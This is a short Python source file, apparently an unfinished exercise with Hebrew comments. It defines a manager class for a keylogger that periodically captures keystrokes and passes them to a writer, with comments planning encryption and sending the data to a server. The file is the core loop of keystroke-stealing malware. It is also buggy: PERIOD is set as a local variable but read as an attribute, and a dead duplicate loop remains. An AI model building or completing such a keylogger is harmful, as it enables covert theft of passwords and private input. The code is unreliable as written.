from the_keylogger import Ikeylogger
from The_filewriter import IWriter
from typing import  Optional

import time
  # שניות


class KeyLoggerManager():
    def __init__(self):
        # create listener
        self.keylog=Ikeylogger()
        self.file=IWriter()
        

        # create filewriter
        # create encryptor
        PERIOD = 30.0  # שניות

    def do_work(self):

        # call listener start
        self.keylog.start_logging()
        data_received = self.keylog.get_logged_keys()
        self.file.send_data(str(data_received))

    def run(self):
        next_t = time.monotonic()
        while True:
            start = time.monotonic()
            self.do_work()
            next_t += self.PERIOD
            sleep_for = max(0.0, next_t - time.monotonic())
            time.sleep(sleep_for)




        # loop while (True or stops after some time???)
        # sleep some time (20 seconds)
        # get data from listener
        # call filewriter function to write data to file
        # call encryptor function to encrypt the file
        # send to server

                # ... הפעולה המחזורית ...

    #def run(self):
     #   next_t = time.monotonic()
      #  while True:
       #     start = time.monotonic()
        #    self.do_work()
         #   next_t += self.PERIOD
          #  sleep_for = max(0.0, next_t - time.monotonic())
           # time.sleep(sleep_for)
